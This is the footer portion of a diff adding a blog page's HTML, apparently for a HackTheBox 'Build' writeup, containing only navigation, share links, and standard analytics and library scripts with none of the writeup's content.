+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/08/12/Build/Build/&t=HackTheBox--HTB Build Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>
+
+
+</body>
+</html>
